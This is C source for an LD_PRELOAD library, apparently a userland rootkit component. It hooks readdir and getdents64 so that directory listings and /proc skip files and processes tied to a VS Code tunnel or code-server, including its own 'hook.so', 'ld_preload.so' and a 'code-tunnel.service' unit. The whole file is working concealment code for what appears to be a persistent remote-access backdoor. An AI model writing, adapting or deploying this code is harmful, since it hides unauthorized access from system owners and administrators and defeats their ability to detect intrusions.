#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <ctype.h>

struct linux_dirent64 {
    unsigned long long d_ino;
    long long          d_off;
    unsigned short     d_reclen;
    unsigned char      d_type;
    char               d_name[];
};

static const char *HIDE_LIST[] = {
    "vscode", ".vscode", "hook.so", "vscode.so", "pid.txt", 
    "code-tunnel.service", "ld_preload.so", "code-server", 
    "vscode-server", "code-tunnel", "node", "code"
};

static int should_hide(const char *name) {
    if (!name) return 0;
    
    // Exact matches
    for (size_t i = 0; i < sizeof(HIDE_LIST)/sizeof(HIDE_LIST[0]); i++) {
        if (strcmp(name, HIDE_LIST[i]) == 0) return 1;
    }
    
    // Substring matches for our specific directories/tools
    if (strstr(name, "code-tunnel") != NULL) return 1;
    if (strstr(name, "vscode-server") != NULL) return 1;
    
    return 0;
}

static int is_proc_dir(int fd) {
    if (fd < 0) return 0;
    char path[64];
    char link[64];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    ssize_t len = readlink(path, link, sizeof(link)-1);
    if (len != -1) {
        link[len] = '\0';
        return (strcmp(link, "/proc") == 0 || strcmp(link, "/proc/") == 0);
    }
    return 0;
}

static int is_numeric(const char *s) {
    if (!s || *s == '\0') return 0;
    while (*s) {
        if (!isdigit(*s)) return 0;
        s++;
    }
    return 1;
}

static int check_process_name(const char *pid_str) {
    if (!is_numeric(pid_str)) return 0;

    char path[64];
    int fd;
    
    snprintf(path, sizeof(path), "/proc/%s/comm", pid_str);
    fd = open(path, O_RDONLY);
    if (fd != -1) {
        char proc_name[64];
        ssize_t n = read(fd, proc_name, sizeof(proc_name)-1);
        close(fd);
        if (n > 0) {
            proc_name[n] = '\0';
            char *nl = strchr(proc_name, '\n');
            if (nl) *nl = '\0';
            if (should_hide(proc_name)) return 1;
        }
    }

    snprintf(path, sizeof(path), "/proc/%s/cmdline", pid_str);
    fd = open(path, O_RDONLY);
    if (fd != -1) {
        char cmdline[1024];
        ssize_t n = read(fd, cmdline, sizeof(cmdline)-1);
        close(fd);
        if (n > 0) {
            cmdline[n] = '\0';
            for (ssize_t i = 0; i < n; i++) {
                if (cmdline[i] == '\0') cmdline[i] = ' ';
            }
            if (strstr(cmdline, "vscode-server") != NULL) return 1;
            if (strstr(cmdline, "code-server") != NULL) return 1;
            if (strstr(cmdline, "code-tunnel") != NULL) return 1;
        }
    }
    
    return 0;
}

// Hook readdir
typedef struct dirent *(*orig_readdir_f)(DIR *);
static orig_readdir_f real_readdir = NULL;

struct dirent *readdir(DIR *dir) {
    if (!real_readdir) real_readdir = (orig_readdir_f)dlsym(RTLD_NEXT, "readdir");
    if (!real_readdir) return NULL;

    struct dirent *entry;
    int fd = dirfd(dir);
    int is_proc = is_proc_dir(fd);

    while ((entry = real_readdir(dir)) != NULL) {
        if (should_hide(entry->d_name)) continue;
        if (is_proc && entry->d_type == DT_DIR && check_process_name(entry->d_name)) continue;
        return entry;
    }
    return NULL;
}

// Hook getdents64
typedef ssize_t (*orig_getdents64_f)(int, void *, size_t);
static orig_getdents64_f real_getdents64 = NULL;

ssize_t getdents64(int fd, void *dirp, size_t count) {
    if (!real_getdents64) {
        real_getdents64 = (orig_getdents64_f)dlsym(RTLD_NEXT, "getdents64");
        if (!real_getdents64) real_getdents64 = (orig_getdents64_f)dlsym(RTLD_NEXT, "__getdents64");
    }
    if (!real_getdents64) return -1;

    ssize_t nread = real_getdents64(fd, dirp, count);
    if (nread <= 0) return nread;

    int is_proc = is_proc_dir(fd);
    ssize_t bpos = 0;

    while (bpos < nread) {
        struct linux_dirent64 *d = (struct linux_dirent64 *)((char *)dirp + bpos);
        int hide = 0;

        if (should_hide(d->d_name)) {
            hide = 1;
        } else if (is_proc && d->d_type == DT_DIR && check_process_name(d->d_name)) {
            hide = 1;
        }

        if (hide) {
            int reclen = d->d_reclen;
            memmove((char *)dirp + bpos, (char *)dirp + bpos + reclen, nread - bpos - reclen);
            nread -= reclen;
        } else {
            bpos += d->d_reclen;
        }
    }
    return nread;
}

// Some apps use __getdents64 instead of getdents64
ssize_t __getdents64(int fd, void *dirp, size_t count) {
    return getdents64(fd, dirp, count);
}